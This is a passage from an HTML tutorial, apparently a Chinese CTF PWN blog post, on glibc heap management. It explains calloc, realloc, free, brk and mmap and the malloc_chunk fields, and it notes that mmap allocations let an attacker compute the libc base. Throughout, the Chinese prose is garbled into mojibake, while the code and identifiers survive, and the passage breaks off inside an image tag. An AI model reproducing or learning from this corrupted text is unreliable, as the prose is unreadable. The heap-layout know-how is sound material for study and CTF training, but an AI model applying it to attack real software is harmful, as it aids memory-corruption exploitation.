ç”³è¯·å†…å­˜åæ‰ä¼šå‡ºç°ï¼Œå¹¶ä¸”ä¼šä¸€æ¬¡æ€§ç”³è¯·å¾ˆå¤§ç©ºé—´çš„å †æ®µï¼ˆ<code>0x555555559000 ~ 0x55555557a000</code>ï¼‰</p><blockquote><p>æ³¨æ„ï¼šæ–°ç‰ˆæœ¬çš„ Glibc å¯¹å †ç»“æ„çš„ç®¡ç†æœ‰äº›åŒºåˆ«ï¼Œä¸Šå›¾æ˜¯åœ¨ Glibc 2.37 çš„ Kali Linux 2024.1 ä¸­è¿›è¡Œçš„æµ‹è¯•</p><p>è€Œåœ¨ Glibc 2.23 çš„ Ubuntu 16.04 ä¸­æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA6.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º6.png"></p></blockquote><hr><h4 id="calloc"><a href="#calloc" class="headerlink" title="calloc"></a>calloc</h4><blockquote><p>å‡½æ•°å£°æ˜ï¼š<code>void *calloc(size_t nitems, size_t size)</code></p><p><code>nitems</code> ä¸ºè¦è¢«åˆ†é…çš„å…ƒç´ ä¸ªæ•°ï¼›<code>size</code> ä¸ºå…ƒç´ çš„å¤§å°</p></blockquote><p><code>calloc()</code> åœ¨åŠŸèƒ½ä¸Šä¸ <code>malloc()</code> å‡ ä¹ç›¸åŒï¼ŒåŒºåˆ«åœ¨äº <em><code>calloc()</code> ç”³è¯·å†…å­˜ç©ºé—´åä¼šå°†å…¶å…¨éƒ¨åˆå§‹åŒ–ä¸º 0</em></p><p>ä½¿ç”¨ <code>calloc()</code> å‡½æ•°æ—¶éœ€è¦æ³¨æ„ï¼Œå¦‚æœåˆ†é…çš„å†…å­˜å—è¿‡å¤§ï¼Œå¯èƒ½ä¼šå¯¼è‡´å†…å­˜ä¸è¶³çš„é—®é¢˜</p><hr><h4 id="realloc"><a href="#realloc" class="headerlink" title="realloc"></a>realloc</h4><blockquote><p>å‡½æ•°å£°æ˜ï¼š<code>void *realloc(void *ptr, size_t size)</code></p><p><code>ptr</code> æ˜¯ä¸€ä¸ªæŒ‡å‘è¦é‡æ–°åˆ†é…å†…å­˜çš„å†…å­˜å—çš„æŒ‡é’ˆï¼›<code>size</code> æ˜¯å†…å­˜å—çš„æ–°çš„å¤§å°ï¼Œä»¥å­—èŠ‚ä¸ºå•ä½</p></blockquote><p><code>realloc()</code> çš„ä½œç”¨æ˜¯é‡æ–°è°ƒæ•´ä¹‹å‰é€šè¿‡Â <code>malloc()</code>Â æˆ–Â <code>calloc()</code>Â æ‰€åˆ†é…çš„Â <code>ptr</code>Â æ‰€æŒ‡å‘çš„å†…å­˜å—çš„å¤§å°ï¼Œå¹¶è¿”å›ä¸€ä¸ªæŒ‡å‘é‡æ–°åˆ†é…å¤§å°çš„å†…å­˜çš„æŒ‡é’ˆï¼›å¦‚æœè¯·æ±‚å¤±è´¥ï¼Œåˆ™è¿”å› NULL</p><ul><li><p>å¦‚æœ <code>ptr</code> ä¸ºç©ºæŒ‡é’ˆï¼Œåˆ™ä¼šåˆ†é…ä¸€ä¸ªæ–°çš„å†…å­˜å—ï¼Œä¸”å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘å®ƒçš„æŒ‡é’ˆï¼Œç›¸å½“äº <code>malloc()</code></p></li><li><p>å¦‚æœ <code>size = 0</code>ï¼Œä¸” <code>ptr</code> æŒ‡å‘ä¸€ä¸ªå·²å­˜åœ¨çš„å†…å­˜å—ï¼Œåˆ™ <code>ptr</code> æ‰€æŒ‡å‘çš„å†…å­˜å—ä¼šè¢«é‡Šæ”¾ï¼Œå¹¶è¿”å›ä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œç›¸å½“äº <code>free()</code></p></li></ul><p>å¦å¤–ï¼Œé’ˆå¯¹é‡æ–°ç”³è¯·çš„å¤§å°ä¸ä¹‹å‰ç”³è¯·å†…å­˜çš„å¤§å°çš„å…³ç³»ï¼Œåˆæœ‰ä¸‰ç§ä¸åŒçš„æƒ…å†µï¼š</p><ol><li><p>å¦‚æœé‡æ–°ç”³è¯·çš„å¤§å° &gt; ä¹‹å‰ç”³è¯·å†…å­˜çš„å¤§å°ï¼Œä¸”å½“å‰å†…å­˜æ®µåé¢æœ‰éœ€è¦çš„å†…å­˜ç©ºé—´ï¼Œåˆ™ç›´æ¥æ‰©å±•è¿™æ®µå†…å­˜ç©ºé—´ï¼Œ<code>realloc()</code> å°†è¿”å›åŸæŒ‡é’ˆ</p></li><li><p>å¦‚æœé‡æ–°ç”³è¯·çš„å¤§å° &gt; ä¹‹å‰ç”³è¯·å†…å­˜çš„å¤§å°ï¼Œä¸”å½“å‰å†…å­˜æ®µåé¢çš„ç©ºé—²ç©ºé—´ä¸å¤Ÿï¼Œé‚£ä¹ˆå°±ä½¿ç”¨å †ä¸­çš„ç¬¬ä¸€ä¸ªèƒ½å¤Ÿæ»¡è¶³è¿™ä¸€è¦æ±‚çš„å†…å­˜å—ï¼Œå°†ç›®å‰çš„æ•°æ®å¤åˆ¶åˆ°æ–°çš„ä½ç½®ï¼Œå¹¶å°†åŸæ¥çš„æ•°æ®å—é‡Šæ”¾æ‰ï¼Œè¿”å›æ–°çš„å†…å­˜å—åœ°å€ï¼Œç›¸å½“äº <code>free() + malloc()</code></p></li><li><p>å¦‚æœé‡æ–°ç”³è¯·çš„å¤§å° &lt; ä¹‹å‰ç”³è¯·å†…å­˜çš„å¤§å°ï¼Œå †å—ä¼šç›´æ¥ç¼©å°ï¼Œè¢«å‰Šå‡çš„å†…å­˜ä¼šé‡Šæ”¾ï¼Œè¿™é‡Œçš„é‡Šæ”¾ä¸ <code>free()</code> ä¸åŒ</p></li></ol><hr><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><blockquote><p>å‡½æ•°å£°æ˜ï¼š<code>void free(void *ptr)</code></p><p><code>ptr</code> æ˜¯ä¸€ä¸ªæŒ‡å‘è¦é‡Šæ”¾å†…å­˜çš„å†…å­˜å—çš„æŒ‡é’ˆ</p></blockquote><p><code>free()</code> çš„ä½œç”¨æ˜¯é‡Šæ”¾ä¹‹å‰é€šè¿‡ <code>malloc()</code>ã€<code>calloc()</code> æˆ– <code>realloc()</code> æ‰€åˆ†é…çš„å†…å­˜ç©ºé—´ï¼Œè¯¥å‡½æ•°ä¸è¿”å›ä»»ä½•å€¼</p><ul><li><p>å¦‚æœä¼ é€’çš„å‚æ•° <code>ptr</code> æ˜¯ä¸€ä¸ªç©ºæŒ‡é’ˆï¼Œåˆ™ä¸ä¼šæ‰§è¡Œä»»ä½•åŠ¨ä½œ</p></li><li><p>å½“å‚æ•° <code>ptr</code> å·²ç»è¢«é‡Šæ”¾ä¹‹åï¼Œå†æ¬¡é‡Šæ”¾ä¼šå‡ºç°ä¹±ä¸ƒå…«ç³Ÿçš„æ•ˆæœï¼ˆDouble Freeï¼‰</p></li><li><p>å½“é‡Šæ”¾å¾ˆå¤§çš„å†…å­˜ç©ºé—´æ—¶ï¼Œç¨‹åºä¼šå°†è¿™äº›å†…å­˜ç©ºé—´è¿˜ç»™ç³»ç»Ÿï¼Œä»¥ä¾¿äºå‡å°ç¨‹åºæ‰€ä½¿ç”¨çš„å†…å­˜ç©ºé—´ï¼ˆè¢« <code>mallopt</code> ç¦ç”¨çš„æƒ…å†µä¸‹é™¤å¤–ï¼‰</p></li></ul><p>è¿˜æ˜¯ä»¥ä¸Šé¢çš„ä¾‹å­æ¥çœ‹ï¼Œæ‰§è¡Œ <code>free()</code> ä¹‹åå †æ®µå¹¶ä¸ä¼šæ¶ˆå¤±ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA4.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º4.png"></p><p>ä½†æ˜¯å †ä¸­çš„å†…å®¹å‘ç”Ÿäº†å˜åŒ–ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA5.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º5.png"></p><p>æˆ‘ä»¬ç”³è¯·çš„ç©ºé—´å˜æˆäº† <code>Free chunk</code></p><blockquote><p>æ³¨æ„ï¼šæ–°ç‰ˆæœ¬çš„ Glibc å¯¹å †ç»“æ„çš„ç®¡ç†æœ‰äº›åŒºåˆ«ï¼Œä¸Šå›¾æ˜¯åœ¨ Glibc 2.37 çš„ Kali Linux 2024.1 ä¸­è¿›è¡Œçš„æµ‹è¯•</p><p>è€Œåœ¨ Glibc 2.23 çš„ Ubuntu 16.04 ä¸­æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA7.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º7.png"></p></blockquote><p>é€šè¿‡ <code>free()</code> é‡Šæ”¾çš„å †å—ä¸ä¼šç«‹åˆ»è¢«å›æ”¶ï¼Œå®ƒä»¬ä¼šå˜æˆ <code>Free chunk</code> å¹¶åŠ ä¸Šäº†ä¸€ç§ <code>xxx bin</code> çš„åå­—ï¼Œä¾‹å¦‚ä¸Šå›¾ Glibc 2.23 ä¸­çš„ <code>fastbins</code>ï¼ˆ<code>fast bin</code>ï¼‰</p><p><em>é€šå¸¸æ¥è¯´ï¼Œå½“å †å—é‡Šæ”¾åï¼Œå¦‚æœä¸å¦ä¸€ä¸ªè¢«é‡Šæ”¾çš„å †å—æˆ–è€… <code>top chunk</code> ç›¸é‚»ï¼Œåˆ™è¿™äº›ç©ºé—´ä¼šè¢«åˆå¹¶</em>ï¼ˆ<strong>ä½†æ˜¯ fast bin æ˜¯ä¸ªç‰¹ä¾‹ï¼Œä¸ä¼šè½»æ˜“åˆå¹¶</strong>ï¼‰</p><hr><h3 id="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"><a href="#å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨" class="headerlink" title="å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨"></a>å†…å­˜åˆ†é…èƒŒåçš„ç³»ç»Ÿè°ƒç”¨</h3><blockquote><p>æ— è®ºæ˜¯ <code>malloc</code> å‡½æ•°è¿˜æ˜¯ <code>free</code> å‡½æ•°ï¼Œæˆ‘ä»¬åŠ¨æ€ç”³è¯·å’Œé‡Šæ”¾å†…å­˜æ—¶ï¼Œéƒ½ç»å¸¸ä¼šä½¿ç”¨ï¼Œä½†æ˜¯å®ƒä»¬å¹¶ä¸æ˜¯çœŸæ­£ä¸ç³»ç»Ÿäº¤äº’çš„å‡½æ•°</p><p>è¿™äº›å‡½æ•°èƒŒåçš„ç³»ç»Ÿè°ƒç”¨ä¸»è¦æ˜¯ <code>brk</code> å‡½æ•°ä»¥åŠ <code>mmap</code> å‡½æ•°</p></blockquote><ol><li><p><code>brk</code> æ˜¯å°† DATA æ•°æ®æ®µçš„æœ€é«˜åœ°å€æŒ‡é’ˆ <code>_edata</code> å¾€é«˜åœ°å€æ¨ï¼ˆ<code>_edata</code> æŒ‡å‘æ•°æ®æ®µçš„æœ€é«˜åœ°å€ï¼‰</p></li><li><p><code>mmap</code> æ˜¯åœ¨è¿›ç¨‹çš„è™šæ‹Ÿåœ°å€ç©ºé—´ä¸­ï¼ˆå †å’Œæ ˆä¸­é—´ï¼Œç§°ä¸ºæ–‡ä»¶æ˜ å°„åŒºåŸŸçš„åœ°æ–¹ï¼‰æ‰¾ä¸€å—ç©ºé—²çš„è™šæ‹Ÿå†…å­˜</p></li></ol><p><code>brk</code> å’Œ <code>mmap</code> è¿™ä¸¤ç§æ–¹å¼åˆ†é…çš„éƒ½æ˜¯è™šæ‹Ÿå†…å­˜ï¼Œæ²¡æœ‰åˆ†é…ç‰©ç†å†…å­˜</p><p>åœ¨ç¬¬ä¸€æ¬¡è®¿é—®å·²åˆ†é…çš„è™šæ‹Ÿåœ°å€ç©ºé—´çš„æ—¶å€™ï¼Œå‘ç”Ÿç¼ºé¡µä¸­æ–­ï¼Œæ“ä½œç³»ç»Ÿè´Ÿè´£åˆ†é…ç‰©ç†å†…å­˜ï¼Œç„¶åå»ºç«‹è™šæ‹Ÿå†…å­˜å’Œç‰©ç†å†…å­˜ä¹‹é—´çš„æ˜ å°„å…³ç³»</p><ul><li><code>malloc</code> å°äº <code>128k</code>ï¼ˆ<code>0x20000</code> å­—èŠ‚ï¼‰çš„å†…å­˜æ—¶ï¼Œä½¿ç”¨ <code>brk</code> åˆ†é…å†…å­˜</li><li><code>malloc</code> å¤§äºç­‰äº <code>128k</code>ï¼ˆ<code>0x20000</code> å­—èŠ‚ï¼‰çš„å†…å­˜æ—¶ï¼Œä½¿ç”¨ <code>mmap</code> åˆ†é…å†…å­˜ï¼Œåœ¨å †å’Œæ ˆä¹‹é—´æ‰¾ä¸€å—ç©ºé—²å†…å­˜åˆ†é…</li></ul><p>ç¬¬ä¸€æ¬¡æ‰§è¡Œ <code>malloc</code> å¯èƒ½å‡ºç°çš„ç³»ç»Ÿè°ƒç”¨å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA19.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º19.png"></p><blockquote><p>æ³¨æ„ï¼š</p><p><code>brk</code> ä¼šç›´æ¥æ‹“å±•åŸæ¥çš„å †ï¼Œ<code>mmap</code> ä¼šå•ç‹¬æ˜ å°„ä¸€å—å†…å­˜</p><p><strong><code>mmap</code> åˆ†é…çš„å†…å­˜ä¸ libc åŸºåœ°å€ä¹‹å‰å­˜åœ¨å›ºå®šçš„åç§»ï¼Œå› æ­¤å¯ä»¥æ¨ç®—å‡º libc çš„åŸºåœ°å€</strong></p></blockquote><hr><h4 id="brk"><a href="#brk" class="headerlink" title="brk"></a>brk</h4><blockquote><p>å¯¹äºå †çš„æ“ä½œï¼Œæ“ä½œç³»ç»Ÿæä¾›äº† <code>brk</code> å‡½æ•°ï¼ŒGlibc åº“æä¾›äº† <code>sbrk</code> å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å¢åŠ  <code>brk</code> çš„å¤§å°æ¥å‘æ“ä½œç³»ç»Ÿç”³è¯·å†…å­˜</p></blockquote><p>åˆå§‹æ—¶ï¼Œå †çš„èµ·å§‹åœ°å€Â <code>start_brk</code>Â ä»¥åŠå †çš„å½“å‰æœ«å°¾Â <code>brk</code>Â æŒ‡å‘åŒä¸€åœ°å€ã€‚æ ¹æ®æ˜¯å¦å¼€å¯ ASLRï¼Œä¸¤è€…çš„å…·ä½“ä½ç½®ä¼šæœ‰æ‰€ä¸åŒï¼š</p><ul><li>ä¸å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œ<code>start_brk</code> ä»¥åŠ <code>brk</code> ä¼šæŒ‡å‘ DATA&#x2F;BSS æ®µçš„ç»“å°¾ã€‚</li><li>å¼€å¯ ASLR ä¿æŠ¤æ—¶ï¼Œ<code>start_brk</code> ä»¥åŠ <code>brk</code> ä¹Ÿä¼šæŒ‡å‘åŒä¸€ä½ç½®ï¼Œåªæ˜¯è¿™ä¸ªä½ç½®æ˜¯åœ¨ DATA&#x2F;BSS æ®µç»“å°¾åçš„éšæœºåç§»å¤„</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA18.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º18.png"></p><hr><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><blockquote><p><code>malloc</code> ä¼šä½¿ç”¨ <code>mmap</code> æ¥åˆ›å»ºç‹¬ç«‹çš„åŒ¿åæ˜ å°„æ®µã€‚åŒ¿åæ˜ å°„çš„ç›®çš„ä¸»è¦æ˜¯å¯ä»¥ç”³è¯·ä»¥ 0 å¡«å……çš„å†…å­˜ï¼Œå¹¶ä¸”è¿™å—å†…å­˜ä»…è¢«è°ƒç”¨è¿›ç¨‹æ‰€ä½¿ç”¨</p></blockquote><ul><li>åœ¨æ‰§è¡Œ <code>mmap</code> ä¹‹å‰ï¼Œåªæœ‰ <code>.so</code> æ–‡ä»¶çš„ <code>mmap</code> æ®µ</li><li>æ‰§è¡Œ <code>mmap</code> ä¹‹åï¼Œæˆ‘ä»¬ç”³è¯·çš„å†…å­˜ä¸å·²ç»å­˜åœ¨çš„å†…å­˜æ®µç»“åˆåœ¨äº†ä¸€èµ·ï¼Œæ„æˆäº†æ–°çš„ <code>mmap</code> æ®µ</li></ul><hr><h2 id="å †çš„ç»“æ„"><a href="#å †çš„ç»“æ„" class="headerlink" title="å †çš„ç»“æ„"></a>å †çš„ç»“æ„</h2><h3 id="å¾®è§‚ç»“æ„"><a href="#å¾®è§‚ç»“æ„" class="headerlink" title="å¾®è§‚ç»“æ„"></a>å¾®è§‚ç»“æ„</h3><h4 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h4><blockquote><p><code>chunk</code> ä¹Ÿå«å—ï¼Œåœ¨å†…å­˜ä¸­è¡¨ç¤ºçš„æ„æ€å°±æ˜¯ä¸€å—å†…å­˜ï¼Œè¿™å—å†…å­˜åœ¨ <code>ptmalloc2</code> å†…éƒ¨ç”¨ <code>malloc_chunk</code> ç»“æ„ä½“æ¥è¡¨ç¤º</p><p>åœ¨ç¨‹åºçš„æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç§°ç”± <code>malloc()</code> ç”³è¯·çš„å†…å­˜ä¸º <code>chunk</code>ï¼Œ<code>chunk</code> ä¹Ÿæ˜¯å †çš„æœ€å°æ“ä½œå•å…ƒ</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/heap-structure/#malloc_chunk">å †ç›¸å…³æ•°æ®ç»“æ„ - CTF Wiki</a></p></blockquote><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA15.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º15.png"></p><p><code>malloc_chunk</code> çš„ç»“æ„ä½“å®šä¹‰å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/*  This struct declaration is misleading (but accurate and necessary).  It declares a "view" into memory allowing access to necessary  fields at known offsets from a given base. See explanation below.*/</span><span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span> <span class="token punctuation">&#123;</span>  INTERNAL_SIZE_T      prev_size<span class="token punctuation">;</span>  <span class="token comment">/* Size of previous chunk (if free).  */</span>  INTERNAL_SIZE_T      size<span class="token punctuation">;</span>       <span class="token comment">/* Size in bytes, including overhead. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd<span class="token punctuation">;</span>         <span class="token comment">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk<span class="token punctuation">;</span>  <span class="token comment">/* Only used for large blocks: pointer to next larger size.  */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> fd_nextsize<span class="token punctuation">;</span> <span class="token comment">/* double links -- used only if free. */</span>  <span class="token keyword">struct</span> <span class="token class-name">malloc_chunk</span><span class="token operator">*</span> bk_nextsize<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸€äº›å‚æ•°çš„è§£é‡Šï¼š</p><ul><li><p><code>prev_size</code></p><ol><li><p>å¦‚æœè¯¥ <code>chunk</code> çš„ç‰©ç†ç›¸é‚»çš„å‰ä¸€åœ°å€ <code>chunk</code>ï¼ˆä¸¤ä¸ªæŒ‡é’ˆçš„åœ°å€å·®å€¼ä¸ºå‰ä¸€ä¸ª <code>chunk</code> çš„å¤§å°ï¼‰æ˜¯ç©ºé—²çš„è¯ï¼Œé‚£ä¹ˆ <code>prev_size</code> è®°å½•çš„æ˜¯å‰ä¸€ä¸ª <code>chunk</code> çš„å¤§å°ï¼ˆåŒ…æ‹¬ <code>chunk</code> å¤´ï¼‰</p></li><li><p>å¦åˆ™ï¼Œ<code>prev_size</code> å¯ä»¥ç”¨æ¥å­˜å‚¨ç‰©ç†ç›¸é‚»çš„å‰ä¸€ä¸ª <code>chunk</code> çš„æ•°æ®ã€‚è¿™é‡Œçš„å‰ä¸€ä¸ª <code>chunk</code> æŒ‡çš„æ˜¯è¾ƒä½åœ°å€çš„ <code>chunk</code></p></li></ol></li><li><p><code>size</code></p><ol><li><p><code>size</code> è¡¨ç¤ºè¯¥ <code>chunk</code> çš„å¤§å°ï¼Œå¤§å°å¿…é¡»æ˜¯ <code>2 * SIZE_SZ</code> çš„æ•´æ•°å€ã€‚å¦‚æœç”³è¯·çš„å†…å­˜å¤§å°ä¸æ˜¯ <code>2 * SIZE_SZ</code> çš„æ•´æ•°å€ï¼Œä¼šè¢«è½¬æ¢æˆæ»¡è¶³å¤§å°çš„æœ€å°çš„ <code>2 * SIZE_SZ</code> çš„å€æ•°</p></li><li><p>32 ä½ç³»ç»Ÿä¸­ï¼Œ<code>SIZE_SZ</code> æ˜¯ 4ï¼›64 ä½ç³»ç»Ÿä¸­ï¼Œ<code>SIZE_SZ</code> æ˜¯ 8ã€‚ è¯¥å­—æ®µçš„ä½ä¸‰ä¸ªæ¯”ç‰¹ä½å¯¹ <code>chunk</code> çš„å¤§å°æ²¡æœ‰å½±å“ï¼Œå®ƒä»¬ä»é«˜åˆ°ä½åˆ†åˆ«è¡¨ç¤º</p></li><li><p>ä¸€èˆ¬æ¥è¯´ï¼Œå †ä¸­ç¬¬ä¸€ä¸ªè¢«åˆ†é…çš„å†…å­˜å—çš„ <code>size</code> å­—æ®µçš„ <code>P</code> ä½éƒ½ä¼šè¢«è®¾ç½®ä¸º 1ï¼Œä»¥ä¾¿äºé˜²æ­¢è®¿é—®å‰é¢çš„éæ³•å†…å­˜ï¼›å½“ä¸€ä¸ª <code>chunk</code> çš„ <code>size</code> çš„ <code>P</code> ä½ä¸º 0 æ—¶ï¼Œæˆ‘ä»¬èƒ½é€šè¿‡ <code>prev_size</code> å­—æ®µæ¥è·å–ä¸Šä¸€ä¸ª <code>chunk</code> çš„å¤§å°ä»¥åŠåœ°å€ã€‚è¿™ä¹Ÿæ–¹ä¾¿è¿›è¡Œç©ºé—² <code>chunk</code> ä¹‹é—´çš„åˆå¹¶</p></li></ol></li></ul><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æ„ä¹‰</th><th></th></tr></thead><tbody><tr><td align="left"><code>ï¼ˆAï¼‰NON_MAIN_ARENA</code></td><td align="left">è®°å½•å½“å‰ <code>chunk</code> æ˜¯å¦ä¸å±äºä¸»çº¿ç¨‹ï¼Œ1 è¡¨ç¤ºä¸å±äºï¼Œ0 è¡¨ç¤ºå±äº</td><td></td></tr><tr><td align="left"><code>ï¼ˆMï¼‰IS_MAPPED</code></td><td align="left">è®°å½•å½“å‰ <code>chunk</code> æ˜¯å¦æ˜¯ç”± <code>mmap</code> åˆ†é…çš„</td><td></td></tr><tr><td align="left"><code>ï¼ˆPï¼‰PREV_INUSE</code></td><td align="left">è®°å½•å‰ä¸€ä¸ª <code>chunk</code> å—æ˜¯å¦è¢«åˆ†é…ï¼Œ0 è¡¨ç¤ºç©ºé—²ï¼Œ1 è¡¨ç¤ºä½¿ç”¨ä¸­</td><td></td></tr></tbody></table><ul><li><p><code>fdã€bk</code></p><ol><li><p><code>chunk</code> å¤„äºåˆ†é…çŠ¶æ€æ—¶ï¼Œä» <code>fd</code> å­—æ®µå¼€å§‹æ˜¯ç”¨æˆ·çš„æ•°æ®ã€‚<code>chunk</code> ç©ºé—²æ—¶ï¼Œä¼šè¢«æ·»åŠ åˆ°å¯¹åº”çš„ç©ºé—²ç®¡ç†é“¾è¡¨ä¸­</p></li><li><p>é€šè¿‡ <code>fd</code> å’Œ <code>bk</code> å¯ä»¥å°†ç©ºé—²çš„ <code>chunk</code> å—åŠ å…¥åˆ°ç©ºé—²çš„ <code>chunk</code> å—é“¾è¡¨è¿›è¡Œç»Ÿä¸€ç®¡ç†</p></li></ol></li></ul><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left"><code>fd</code></td><td align="left">æŒ‡å‘ä¸‹ä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ <code>chunk</code></td></tr><tr><td align="left"><code>bk</code></td><td align="left">æŒ‡å‘ä¸Šä¸€ä¸ªï¼ˆéç‰©ç†ç›¸é‚»ï¼‰ç©ºé—²çš„ <code>chunk</code></td></tr></tbody></table><ul><li><p><code>fd_nextsizeã€bk_nextsize</code></p><ol><li><p>åªæœ‰ <code>chunk</code> ç©ºé—²çš„æ—¶å€™æ‰ä½¿ç”¨ï¼Œä¸è¿‡å…¶ç”¨äºè¾ƒå¤§çš„ <code>chunk</code>ï¼ˆ<code>large chunk</code>ï¼‰</p></li><li><p>ä¸€èˆ¬ç©ºé—²çš„ <code>large chunk</code> åœ¨ <code>fd</code> çš„éå†é¡ºåºä¸­ï¼ŒæŒ‰ç…§ç”±å¤§åˆ°å°çš„é¡ºåºæ’åˆ—ã€‚<strong>è¿™æ ·åšå¯ä»¥é¿å…åœ¨å¯»æ‰¾åˆé€‚ chunk æ—¶æŒ¨ä¸ªéå†</strong></p></li></ol></li></ul><table><thead><tr><th align="left">å‚æ•°</th><th align="left">æ„ä¹‰</th></tr></thead><tbody><tr><td align="left"><code>fd_nextsize</code></td><td align="left">æŒ‡å‘å‰ä¸€ä¸ªä¸å½“å‰ <code>chunk</code> å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« <code>bin</code> çš„å¤´æŒ‡é’ˆ</td></tr><tr><td align="left"><code>bk_nextsize</code></td><td align="left">æŒ‡å‘åä¸€ä¸ªä¸å½“å‰ <code>chunk</code> å¤§å°ä¸åŒçš„ç¬¬ä¸€ä¸ªç©ºé—²å—ï¼Œä¸åŒ…å« <code>bin</code> çš„å¤´æŒ‡é’ˆ</td></tr></tbody></table><blockquote><p>æ³¨æ„ï¼š</p><p><strong>æ— è®ºä¸€ä¸ª chunk çš„å¤§å°å¦‚ä½•ï¼Œå¤„äºåˆ†é…çŠ¶æ€è¿˜æ˜¯é‡Šæ”¾çŠ¶æ€ï¼Œå®ƒä»¬éƒ½ä½¿ç”¨ä¸€ä¸ªç»Ÿä¸€çš„ç»“æ„</strong></p><p><em>è™½ç„¶åœ¨åˆ†é…çŠ¶æ€å’Œé‡Šæ”¾çŠ¶æ€ä¸‹ï¼Œ<code>chunk</code> éƒ½æ˜¯åŒä¸€ä¸ªæ•°æ®ç»“æ„ï¼Œä½†æ˜¯å®ƒä»¬çš„è¡¨ç°å½¢å¼æ˜¯ä¸ä¸€æ ·çš„</em></p></blockquote><ul><li><code>chunk</code> å¤„äºåˆ†é…çŠ¶æ€ï¼ˆ<code>Allocated chunk</code>ï¼‰ï¼š</li></ul><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20PWN_%E5%A0%86%E4%B8%8E%E5%A0%86%E6%BA%A2%E5%87%BA9.png" alt="CTF - PWN_å †ä¸å †æº¢å‡º9.png"></p><p><strong>å‰ä¸¤ä¸ªå­—æ®µç§°ä¸º <code>chunk header</code>ï¼Œåé¢çš„éƒ¨åˆ†ç§°ä¸º <code>user data</code></strong></p><p><mark>æ¯æ¬¡ <code>malloc</code> ç”³è¯·å¾—åˆ°çš„å†…å­˜æŒ‡é’ˆï¼Œå…¶å®æŒ‡å‘ <code>user data</code> çš„èµ·å§‹å¤„</mark></p><blockquote><p><code>chunk</code> ä¸­çš„ç©ºé—´å¤ç”¨ï¼š</p><p>å½“ä¸€ä¸ª <code>chunk</code> å¤„äºä½¿ç”¨çŠ¶æ€æ—¶ï¼Œå®ƒçš„ä¸‹ä¸€ä¸ª <code>chunk</code> çš„ <code>prev_size</code> åŸŸæ— æ•ˆï¼Œæ‰€ä»¥ä¸‹ä¸€ä¸ª <code>chunk</code> çš„è¯¥éƒ¨åˆ†ä¹Ÿå¯ä»¥è¢«å½“å‰ <code>chunk</code> ä½¿ç”¨</p></blockquote><ul><li><code>chunk</code> å¤„äºé‡Šæ”¾çŠ¶æ€ï¼ˆ<code>Freed chunk</code>ï¼‰ï¼ˆå¯èƒ½æ˜¯å¾ªç¯åŒå‘é“¾è¡¨ï¼Œä¹Ÿå¯èƒ½æ˜¯å•å‘é“¾è¡¨ï¼‰ï¼š</li></ul><p><img 